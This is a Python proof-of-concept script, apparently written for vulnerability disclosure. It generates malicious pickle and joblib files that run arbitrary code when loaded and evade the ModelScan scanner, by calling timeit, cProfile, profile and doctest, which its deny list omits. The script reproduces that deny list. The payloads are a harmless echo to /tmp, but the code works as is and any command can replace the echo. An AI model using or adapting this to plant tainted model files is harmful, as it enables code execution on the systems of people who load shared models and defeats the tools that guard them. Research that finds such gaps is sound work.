"""
ModelScan Bypass PoC Generator
================================
Generates malicious pickle files that bypass ModelScan v0.8.7 (latest)
while executing arbitrary code upon unpickling.

5 bypass methods using modules NOT in ModelScan's unsafe_globals:
1. timeit.timeit()
2. timeit.repeat()
3. cProfile.run()
4. profile.run()
5. doctest.debug_script()

Author: Hussain Al-Saibai
Date: 2026-02-15
"""

import pickle
import struct
import os

# Each bypass creates a pickle that calls module.function(payload_string)
# The payload string contains Python code that gets executed

BYPASSES = {
    "timeit_timeit": ("timeit", "timeit", "__import__('os').system('echo PWNED_timeit_timeit > /tmp/poc_proof')"),
    "timeit_repeat": ("timeit", "repeat", "__import__('os').system('echo PWNED_timeit_repeat > /tmp/poc_proof')"),
    "cProfile_run": ("cProfile", "run", "__import__('os').system('echo PWNED_cProfile_run > /tmp/poc_proof')"),
    "profile_run": ("profile", "run", "__import__('os').system('echo PWNED_profile_run > /tmp/poc_proof')"),
    "doctest_debug_script": ("doctest", "debug_script", "import os; os.system('echo PWNED_doctest > /tmp/poc_proof')"),
}


class MaliciousReducer:
    """Creates a picklable object that calls an arbitrary function with a string arg."""
    def __init__(self, module, func, payload):
        self.module = module
        self.func = func
        self.payload = payload

    def __reduce__(self):
        # This produces: module.func(payload) when unpickled
        import importlib
        # We use a tuple that pickle interprets as: call callable with args
        # The GLOBAL opcode will reference module.func
        # which is NOT in ModelScan's unsafe_globals list
        return (self._get_callable(), (self.payload,))

    def _get_callable(self):
        mod = __import__(self.module)
        return getattr(mod, self.func)


def generate_pickle_v4(module, func, payload, filename):
    """Generate a pickle protocol 4 file with STACK_GLOBAL opcode."""
    obj = type('Exploit', (), {
        '__reduce__': lambda self: (
            getattr(__import__(module), func),
            (payload,)
        )
    })()
    
    with open(filename, 'wb') as f:
        pickle.dump(obj, f, protocol=4)
    
    return filename


def generate_all_pocs(output_dir="poc_models"):
    os.makedirs(output_dir, exist_ok=True)
    files = []
    
    for name, (module, func, payload) in BYPASSES.items():
        # Generate .pkl (pickle format)
        pkl_path = os.path.join(output_dir, f"bypass_{name}.pkl")
        generate_pickle_v4(module, func, payload, pkl_path)
        files.append(pkl_path)
        print(f"[+] Generated: {pkl_path}")
        
        # Also generate .joblib variant (same format, different extension)
        joblib_path = os.path.join(output_dir, f"bypass_{name}.joblib")
        generate_pickle_v4(module, func, payload, joblib_path)
        files.append(joblib_path)
        print(f"[+] Generated: {joblib_path}")
    
    return files


def verify_bypass_static():
    """Verify that the modules used are NOT in ModelScan's unsafe_globals."""
    unsafe_modules = {
        "__builtin__", "builtins", "runpy", "os", "nt", "posix",
        "socket", "subprocess", "sys", "operator", "pty", "pickle",
        "_pickle", "bdb", "pdb", "shutil", "asyncio",
        "webbrowser", "httplib", "requests.api", "aiohttp.client"
    }
    
    bypass_modules = {"timeit", "cProfile", "profile", "doctest"}
    
    print("\n[*] Verification: Bypass modules vs ModelScan unsafe_globals")
    for mod in bypass_modules:
        in_list = mod in unsafe_modules
        status = "❌ DETECTED" if in_list else "✅ BYPASSES"
        print(f"    {mod}: {status}")
    
    overlap = bypass_modules & unsafe_modules
    if not overlap:
        print("\n[✓] All bypass modules are UNDETECTED by ModelScan!")
    else:
        print(f"\n[!] WARNING: These modules ARE detected: {overlap}")


if __name__ == "__main__":
    print("=" * 60)
    print("ModelScan Bypass PoC Generator")
    print("=" * 60)
    
    verify_bypass_static()
    print()
    files = generate_all_pocs()
    print(f"\n[✓] Generated {len(files)} PoC files")
    print("\nTo test with ModelScan:")
    print("  modelscan --path poc_models/bypass_timeit_timeit.pkl")
    print("\nExpected result: 'No issues found' (false negative)")
